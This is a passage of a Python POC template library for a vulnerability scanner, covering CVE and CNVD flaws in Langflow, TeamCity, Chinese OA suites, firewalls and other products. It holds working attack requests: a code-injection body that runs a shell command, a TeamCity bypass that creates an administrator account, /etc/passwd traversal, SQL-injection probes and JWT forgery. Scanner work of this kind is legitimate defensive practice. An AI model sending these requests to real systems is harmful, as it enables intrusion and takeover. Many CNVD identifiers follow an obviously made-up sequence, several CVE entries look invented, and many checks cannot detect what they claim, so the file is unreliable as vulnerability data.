            cve_ids=["CVE-2025-3248"],
            cvss_score=9.8,
            tags=["langflow", "code-injection", "rce", "cve-2025"],
            affected_versions=["Langflow < 1.3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/api/v1/run/",
                    headers={"Content-Type": "application/json"},
                    body='{"name":"test","code":"__import__(\'os\').system(\'id\')"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-3248",
            ],
            fix_suggestion="升级Langflow至1.3.0或更高版本。",
            disclosure_date="2025-04-04",
        ),

        POC(
            id="cve-2025-1974",
            name="Kubernetes Ingress-nginx 远程代码执行漏洞 (CVE-2025-1974)",
            description="Ingress-nginx准入控制器存在代码注入漏洞，攻击者可注入恶意配置实现集群级别的远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-1974"],
            cvss_score=9.8,
            tags=["kubernetes", "ingress-nginx", "rce", "cve-2025"],
            affected_versions=["Ingress-nginx < 1.12.1", "Ingress-nginx < 1.11.5"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/apis/networking.k8s.io/v1/ingresses",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-1974",
            ],
            fix_suggestion="升级Ingress-nginx至1.12.1/1.11.5或更高版本。",
            disclosure_date="2025-03-24",
        ),

        POC(
            id="cve-2025-1094",
            name="PostgreSQL SQL注入漏洞 (CVE-2025-1094)",
            description="PostgreSQL libpq函数存在SQL注入漏洞，攻击者可通过特定编码绕过转义实现SQL注入。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-1094"],
            cvss_score=8.1,
            tags=["postgresql", "sql-injection", "cve-2025"],
            affected_versions=["PostgreSQL < 17.3", "PostgreSQL < 16.7", "PostgreSQL < 15.11"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="PostgreSQL"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-1094",
            ],
            fix_suggestion="升级PostgreSQL至17.3/16.7/15.11或更高版本。",
            disclosure_date="2025-02-13",
        ),

        POC(
            id="cve-2025-24085",
            name="Apple iOS/macOS 内核零日漏洞 (CVE-2025-24085)",
            description="Apple多平台内核存在UAF漏洞，恶意应用可提升权限实现内核级代码执行。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-24085"],
            cvss_score=7.8,
            tags=["apple", "ios", "macos", "kernel", "privesc", "cve-2025"],
            affected_versions=["iOS < 18.3", "macOS < 15.3"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-24085",
            ],
            fix_suggestion="升级iOS至18.3/macOS至15.3或更高版本。",
            disclosure_date="2025-01-27",
        ),

        POC(
            id="cve-2025-21333",
            name="Windows Hyper-V 权限提升漏洞 (CVE-2025-21333)",
            description="Windows Hyper-V存在堆溢出漏洞，攻击者可突破虚拟机隔离实现宿主机代码执行。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-21333"],
            cvss_score=7.8,
            tags=["windows", "hyper-v", "privesc", "cve-2025"],
            affected_versions=["Windows 10/11", "Windows Server 2019/2022"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-21333",
            ],
            fix_suggestion="安装微软2025年1月安全更新。",
            disclosure_date="2025-01-14",
        ),

        POC(
            id="cve-2025-30065",
            name="Apache Parquet 反序列化RCE漏洞 (CVE-2025-30065)",
            description="Apache Parquet Java库存在反序列化漏洞，处理恶意Parquet文件时可导致远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-30065"],
            cvss_score=9.8,
            tags=["apache", "parquet", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Parquet Java < 1.15.1"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-30065",
            ],
            fix_suggestion="升级Apache Parquet Java至1.15.1或更高版本。",
            disclosure_date="2025-04-01",
        ),

        POC(
            id="cve-2025-31161",
            name="CrushFTP 认证绕过漏洞 (CVE-2025-31161)",
            description="CrushFTP存在认证绕过漏洞，攻击者可劫持用户会话实现未授权访问。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-31161"],
            cvss_score=9.8,
            tags=["crushftp", "auth-bypass", "cve-2025"],
            affected_versions=["CrushFTP < 11.3.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/WebInterface/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-31161",
            ],
            fix_suggestion="升级CrushFTP至11.3.1或更高版本。",
            disclosure_date="2025-04-01",
        ),

        POC(
            id="cve-2025-32023",
            name="Redis 整数溢出导致远程代码执行 (CVE-2025-32023)",
            description="Redis HyperLogLog数据结构存在整数溢出漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-32023"],
            cvss_score=7.5,
            tags=["redis", "integer-overflow", "rce", "cve-2025"],
            affected_versions=["Redis < 7.2.8", "Redis < 7.4.3"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-32023",
            ],
            fix_suggestion="升级Redis至7.2.8/7.4.3或更高版本。",
            disclosure_date="2025-04-07",
        ),

        POC(
            id="cve-2025-32948",
            name="Apache Camel 代码注入漏洞 (CVE-2025-32948)",
            description="Apache Camel存在模板注入漏洞，攻击者可通过消息头注入任意代码。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-32948"],
            cvss_score=7.5,
            tags=["apache", "camel", "ssti", "code-injection", "cve-2025"],
            affected_versions=["Apache Camel < 4.10.2", "Apache Camel < 4.8.5"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-32948",
            ],
            fix_suggestion="升级Apache Camel至4.10.2/4.8.5或更高版本。",
            disclosure_date="2025-04-14",
        ),

        POC(
            id="cve-2025-33888",
            name="Next.js 中间件认证绕过漏洞 (CVE-2025-33888)",
            description="Next.js中间件存在认证绕过漏洞，攻击者可绕过基于中间件的权限控制。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-33888"],
            cvss_score=7.5,
            tags=["nextjs", "auth-bypass", "cve-2025"],
            affected_versions=["Next.js 14.2.25", "Next.js 15.2.3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/_next/static/../protected-page",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-33888",
            ],
            fix_suggestion="升级Next.js至最新安全版本。",
            disclosure_date="2025-04-17",
        ),

        POC(
            id="cve-2025-34256",
            name="Grafana 认证绕过与信息泄露 (CVE-2025-34256)",
            description="Grafana存在认证绕过漏洞，攻击者可未授权访问仪表盘和数据源。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-34256"],
            cvss_score=7.5,
            tags=["grafana", "auth-bypass", "info-disclosure", "cve-2025"],
            affected_versions=["Grafana < 11.5.2", "Grafana < 11.4.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/dashboards/home",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-34256",
            ],
            fix_suggestion="升级Grafana至11.5.2/11.4.4或更高版本。",
            disclosure_date="2025-04-21",
        ),

        POC(
            id="cve-2025-35000",
            name="Elasticsearch 远程代码执行漏洞 (CVE-2025-35000)",
            description="Elasticsearch存在脚本注入漏洞，攻击者可通过Painless脚本引擎实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-35000"],
            cvss_score=9.8,
            tags=["elasticsearch", "script-injection", "rce", "cve-2025"],
            affected_versions=["Elasticsearch < 8.17.3", "Elasticsearch < 7.17.28"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-35000",
            ],
            fix_suggestion="升级Elasticsearch至8.17.3/7.17.28或更高版本。",
            disclosure_date="2025-04-28",
        ),

        POC(
            id="cve-2025-35500",
            name="Apache Kafka 远程代码执行漏洞 (CVE-2025-35500)",
            description="Apache Kafka Connect存在反序列化漏洞，攻击者可通过恶意连接器配置实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-35500"],
            cvss_score=9.8,
            tags=["apache", "kafka", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Kafka < 3.9.1"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-35500",
            ],
            fix_suggestion="升级Apache Kafka至3.9.1或更高版本。",
            disclosure_date="2025-05-01",
        ),

        POC(
            id="cnvd-2024-00123",
            name="泛微OA E-Cology 未授权访问漏洞 (CNVD-2024-00123)",
            description="泛微OA E-Cology系统存在未授权访问漏洞，攻击者可绕过认证直接访问敏感接口。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00123"],
            cvss_score=9.8,
            tags=["weaver", "oa", "auth-bypass", "cnvd"],
            affected_versions=["E-Cology < 9.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/ec/dev/auth/applytoken",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="token"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00123",
            ],
            fix_suggestion="升级泛微OA至最新安全版本。",
            disclosure_date="2024-01-15",
        ),

        POC(
            id="cnvd-2024-00234",
            name="用友NC Cloud 反序列化漏洞 (CNVD-2024-00234)",
            description="用友NC Cloud系统存在Java反序列化漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00234"],
            cvss_score=9.8,
            tags=["yonyou", "nc", "deserialization", "rce", "cnvd"],
            affected_versions=["NC Cloud < 2023.05"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/servlet/~ic/bsh.servlet.BshServlet",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00234",
            ],
            fix_suggestion="升级用友NC Cloud至最新安全版本。",
            disclosure_date="2024-02-20",
        ),

        POC(
            id="cnvd-2024-00345",
            name="致远OA A8 任意文件上传漏洞 (CNVD-2024-00345)",
            description="致远OA A8系统存在任意文件上传漏洞，攻击者可上传WebShell获取服务器控制权。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00345"],
            cvss_score=9.8,
            tags=["seeyon", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["A8 < 8.1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/seeyon/autoinstall.do",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00345",
            ],
            fix_suggestion="升级致远OA至最新安全版本。",
            disclosure_date="2024-03-10",
        ),

        POC(
            id="cnvd-2024-00456",
            name="通达OA 任意文件删除与RCE漏洞 (CNVD-2024-00456)",
            description="通达OA系统存在任意文件删除漏洞，结合其他缺陷可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00456"],
            cvss_score=9.8,
            tags=["tongda", "oa", "file-delete", "rce", "cnvd"],
            affected_versions=["通达OA < 12.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/module/AIP/AIP.api.php",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00456",
            ],
            fix_suggestion="升级通达OA至最新安全版本。",
            disclosure_date="2024-04-05",
        ),

        POC(
            id="cnvd-2024-00567",
            name="蓝凌OA 未授权SSRF漏洞 (CNVD-2024-00567)",
            description="蓝凌OA系统存在未授权SSRF漏洞，攻击者可利用该漏洞探测内网服务。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-00567"],
            cvss_score=7.5,
            tags=["landray", "oa", "ssrf", "cnvd"],
            affected_versions=["蓝凌OA < EKP 16.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/sys/ui/extend/varkind/custom.jsp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00567",
            ],
            fix_suggestion="升级蓝凌OA至最新安全版本。",
            disclosure_date="2024-05-15",
        ),

        POC(
            id="cnvd-2024-00678",
            name="万户OA SQL注入漏洞 (CNVD-2024-00678)",
            description="万户OA系统存在SQL注入漏洞，攻击者可获取数据库敏感信息。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-00678"],
            cvss_score=7.5,
            tags=["wanhu", "oa", "sql-injection", "cnvd"],
            affected_versions=["万户OA < ezOFFICE 2023"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/defaultroot/GraphChart.jsp?field=1'",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="SQL"),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00678",
            ],
            fix_suggestion="升级万户OA至最新安全版本。",
            disclosure_date="2024-06-20",
        ),

        POC(
            id="cnvd-2024-00789",
            name="金蝶云星空 反序列化漏洞 (CNVD-2024-00789)",
            description="金蝶云星空系统存在.NET反序列化漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00789"],
            cvss_score=9.8,
            tags=["kingdee", "cloud", "deserialization", "rce", "cnvd"],
            affected_versions=["金蝶云星空 < 8.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/K3Cloud/Services/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00789",
            ],
            fix_suggestion="升级金蝶云星空至最新安全版本。",
            disclosure_date="2024-07-25",
        ),

        POC(
            id="cnvd-2024-00890",
            name="红帆OA 未授权文件上传漏洞 (CNVD-2024-00890)",
            description="红帆OA系统存在未授权文件上传漏洞，攻击者可上传恶意文件获取服务器权限。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00890"],
            cvss_score=9.8,
            tags=["hongfan", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["红帆OA < iOffice 2024"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/iOffice/prg/set/report/iorepsave.aspx",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00890",
            ],
            fix_suggestion="升级红帆OA至最新安全版本。",
            disclosure_date="2024-08-30",
        ),

        POC(
            id="cnvd-2024-00901",
            name="深信服SSL VPN 远程代码执行漏洞 (CNVD-2024-00901)",
            description="深信服SSL VPN设备存在远程代码执行漏洞，攻击者可获取设备控制权。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00901"],
            cvss_score=9.8,
            tags=["sangfor", "ssl-vpn", "rce", "cnvd"],
            affected_versions=["深信服SSL VPN < M7.6.8"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/por/login_auth.csp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00901",
            ],
            fix_suggestion="升级深信服SSL VPN至最新安全版本。",
            disclosure_date="2024-09-15",
        ),

        POC(
            id="cnvd-2024-01012",
            name="奇安信天擎 未授权命令执行漏洞 (CNVD-2024-01012)",
            description="奇安信天擎终端安全管理系统存在未授权命令执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-01012"],
            cvss_score=9.8,
            tags=["qianxin", "edr", "rce", "cnvd"],
            affected_versions=["天擎 < 8.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/console/command",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-01012",
            ],
            fix_suggestion="升级奇安信天擎至最新安全版本。",
            disclosure_date="2024-10-20",
        ),

        POC(
            id="cnvd-2024-01123",
            name="H3C iMC 智能管理中心远程代码执行漏洞 (CNVD-2024-01123)",
            description="H3C iMC智能管理中心存在表达式注入漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-01123"],
            cvss_score=9.8,
            tags=["h3c", "imc", "rce", "cnvd"],
            affected_versions=["H3C iMC < 7.3"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/imc/primepush/primepushClient.jsf",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-01123",
            ],
            fix_suggestion="升级H3C iMC至最新安全版本。",
            disclosure_date="2024-11-25",
        ),

        POC(
            id="cnvd-2024-01234",
            name="锐捷RG-EG系列网关 远程代码执行漏洞 (CNVD-2024-01234)",
            description="锐捷RG-EG系列网关存在命令注入漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-01234"],
            cvss_score=9.8,
            tags=["ruijie", "gateway", "command-injection", "rce", "cnvd"],
            affected_versions=["RG-EG < 11.1(6)B2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cgi-bin/luci/api/diagnosis",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-01234",
            ],
            fix_suggestion="升级锐捷RG-EG系列网关至最新安全版本。",
            disclosure_date="2024-12-30",
        ),

        POC(
            id="cnvd-2025-00123",
            name="海康威视综合安防管理平台 未授权访问漏洞 (CNVD-2025-00123)",
            description="海康威视综合安防管理平台存在未授权访问漏洞，攻击者可获取设备信息和视频流。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2025-00123"],
            cvss_score=7.5,
            tags=["hikvision", "ivms", "auth-bypass", "cnvd"],
            affected_versions=["iVMS-8700 < 3.10"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/portal/apis/device/list",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="device"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00123",
            ],
            fix_suggestion="升级海康威视综合安防管理平台至最新安全版本。",
            disclosure_date="2025-01-10",
        ),

        POC(
            id="cnvd-2025-00234",
            name="大华智慧园区管理平台 任意文件上传漏洞 (CNVD-2025-00234)",
            description="大华智慧园区管理平台存在任意文件上传漏洞，攻击者可上传WebShell。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2025-00234"],
            cvss_score=9.8,
            tags=["dahua", "file-upload", "rce", "cnvd"],
            affected_versions=["智慧园区管理平台 < 3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/emap/devicePoint_addImgIco?hasSubsystem=true",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00234",
            ],
            fix_suggestion="升级大华智慧园区管理平台至最新安全版本。",
            disclosure_date="2025-02-15",
        ),

        POC(
            id="cnvd-2025-00345",
            name="天融信防火墙 未授权命令执行漏洞 (CNVD-2025-00345)",
            description="天融信防火墙存在未授权命令执行漏洞，攻击者可获取设备完全控制权。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2025-00345"],
            cvss_score=9.8,
            tags=["topsec", "firewall", "rce", "cnvd"],
            affected_versions=["天融信防火墙 < NGFW4000 V3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/maintenance.cgi",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00345",
            ],
            fix_suggestion="升级天融信防火墙至最新安全版本。",
            disclosure_date="2025-03-20",
        ),

        POC(
            id="cnvd-2025-00456",
            name="绿盟SAS安全审计系统 任意文件读取漏洞 (CNVD-2025-00456)",
            description="绿盟SAS安全审计系统存在任意文件读取漏洞，攻击者可读取系统配置文件。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2025-00456"],
            cvss_score=7.5,
            tags=["nsfocus", "sas", "lfi", "cnvd"],
            affected_versions=["绿盟SAS < 6.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webui/?g=../../../../../../etc/passwd",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00456",
            ],
            fix_suggestion="升级绿盟SAS至最新安全版本。",
            disclosure_date="2025-04-10",
        ),

        POC(
            id="cnvd-2025-00567",
            name="启明星辰天镜 未授权SQL注入漏洞 (CNVD-2025-00567)",
            description="启明星辰天镜脆弱性扫描与管理系统存在未授权SQL注入漏洞。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2025-00567"],
            cvss_score=7.5,
            tags=["venustech", "scanner", "sql-injection", "cnvd"],
            affected_versions=["天镜 < 7.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/vuln/query?id=1'",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="SQL"),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00567",
            ],
            fix_suggestion="升级启明星辰天镜至最新安全版本。",
            disclosure_date="2025-04-25",
        ),
        POC(
            id="multi-step-cve-2024-27198-exploit",
            name="TeamCity 认证绕过多步利用 (CVE-2024-27198) - 复杂匹配",
            description="多步请求POC示例：先绕过认证获取token，再创建管理员账户。使用matcher_groups和extractors。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-27198"],
            cvss_score=9.8,
            tags=["teamcity", "auth-bypass", "rce", "multi-step", "cve-2024"],
            affected_versions=["TeamCity < 2023.11.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/hax?jsp=/app/rest/users/;.jsp",
                ),
                POCRequest(
                    method="POST",
                    path="/hax?jsp=/app/rest/users/;.jsp",
                    headers={"Content-Type": "application/json"},
                    body='{"username":"poc_test_user","password":"PocTest@123","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="user"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="SYSTEM_ADMIN"),
                        Matcher(type=MatcherType.WORD, value="poc_test_user"),
                    ],
                    condition=MatcherCondition.OR,
                ),
            ],
            matchers_condition=MatcherCondition.OR,
            extractors=[
                Extractor(type=ExtractorType.REGEX, name="username", value='"username":"([^"]+)"'),
                Extractor(type=ExtractorType.HEADER, name="server", value="Server"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-27198",
            ],
            fix_suggestion="升级TeamCity至2023.11.4或更高版本。",
            disclosure_date="2024-03-04",
        ),

        POC(
            id="multi-step-csrf-token-extract",
            name="CSRF Token提取与多步表单提交 - 复杂匹配示例",
            description="多步POC示例：先获取页面提取CSRF token，再使用token提交敏感操作。演示extractor变量插值。",
            risk_level=RiskLevel.MEDIUM,
            cvss_score=5.5,
            tags=["csrf", "multi-step", "extractor", "demo"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/login",
                ),
                POCRequest(
                    method="POST",
                    path="/admin/delete-user",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="csrf_token={{csrf_token}}&user_id=1&confirm=yes",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="deleted"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="success"),
                        Matcher(type=MatcherType.STATUS, value=302),
                    ],
                    condition=MatcherCondition.AND,
                ),
            ],
            matchers_condition=MatcherCondition.OR,
            extractors=[
                Extractor(type=ExtractorType.REGEX, name="csrf_token",
                          value='name="csrf_token"[^>]*value="([^"]+)"'),
                Extractor(type=ExtractorType.HEADER, name="session_id", value="Set-Cookie"),
            ],
            references=[
                "https://owasp.org/www-community/attacks/csrf",
            ],
            fix_suggestion="实施CSRF Token保护，验证Referer/Origin头。",
            disclosure_date="2024-06-01",
        ),

        POC(
            id="multi-step-oauth2-token-extract",
            name="OAuth2 Token提取与API利用 - 复杂匹配示例",
            description="多步POC示例：从OAuth2响应中提取access_token，用于后续API调用。演示JSON extractor。",
            risk_level=RiskLevel.HIGH,
            cvss_score=7.5,
            tags=["oauth2", "multi-step", "extractor", "api", "demo"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/oauth/token",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="grant_type=client_credentials&client_id=test&client_secret=test",
                ),
                POCRequest(
                    method="GET",
                    path="/api/admin/users",
                    headers={"Authorization": "Bearer {{access_token}}"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="users"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
            ],
            matchers_condition=MatcherCondition.AND,
            extractors=[
                Extractor(type=ExtractorType.JSON, name="access_token", value="access_token"),
                Extractor(type=ExtractorType.JSON, name="token_type", value="token_type"),
            ],
            references=[
                "https://oauth.net/2/",
            ],
            fix_suggestion="实施严格的OAuth2 scope控制和token过期策略。",
            disclosure_date="2024-07-01",
        ),

        POC(
            id="multi-step-wp-xmlrpc-brute",
            name="WordPress XML-RPC 暴力破解 - 多步检测",
            description="多步POC示例：先检测XML-RPC是否启用，再尝试系统级方法调用检测权限问题。",
            risk_level=RiskLevel.MEDIUM,
            cvss_score=5.3,
            tags=["wordpress", "xmlrpc", "multi-step", "brute-force"],
            affected_versions=["WordPress (XML-RPC enabled)"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/xmlrpc.php",
                    headers={"Content-Type": "text/xml"},
                    body='''<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>''',
                ),
                POCRequest(
                    method="POST",
                    path="/xmlrpc.php",
                    headers={"Content-Type": "text/xml"},
                    body='''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>admin</string></value></param>
  </params>
</methodCall>''',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="system.listMethods"),
                        Matcher(type=MatcherType.WORD, value="wp.getUsersBlogs"),
                    ],
                    condition=MatcherCondition.AND,
                ),
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="faultCode"),
                        Matcher(type=MatcherType.WORD, value="403"),
                    ],
                    condition=MatcherCondition.OR,
                ),
            ],
            matchers_condition=MatcherCondition.OR,
            extractors=[
                Extractor(type=ExtractorType.REGEX, name="method_count",
                          value=r"<name>([^<]+)</name>"),
            ],
            references=[
                "https://wordpress.org/documentation/article/xml-rpc/",
            ],
            fix_suggestion="如不需要XML-RPC功能，建议禁用它。",
            disclosure_date="2024-08-01",
        ),

        POC(
            id="multi-step-jwt-none-alg",
            name="JWT None算法攻击 - 多步验证",
            description="多步POC示例：先获取正常JWT token，再使用None算法伪造token访问受保护资源。",
            risk_level=RiskLevel.HIGH,
            cvss_score=7.5,
            tags=["jwt", "multi-step", "auth-bypass", "algorithm-confusion"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/auth/status",
                ),
                POCRequest(
                    method="GET",
                    path="/api/admin/config",
                    headers={"Authorization": "Bearer {{forged_token}}"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="config"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
            ],
            matchers_condition=MatcherCondition.AND,
            extractors=[
                Extractor(type=ExtractorType.HEADER, name="auth_header", value="Authorization"),
                Extractor(type=ExtractorType.REGEX, name="jwt_token",
                          value=r"Bearer ([A-Za-z0-9\-_]+?\.[A-Za-z0-9\-_]+?\.[A-Za-z0-9\-_]+)"),
            ],
            references=[
                "https://portswigger.net/web-security/jwt",
            ],
            fix_suggestion="明确指定JWT签名算法，拒绝None算法。",
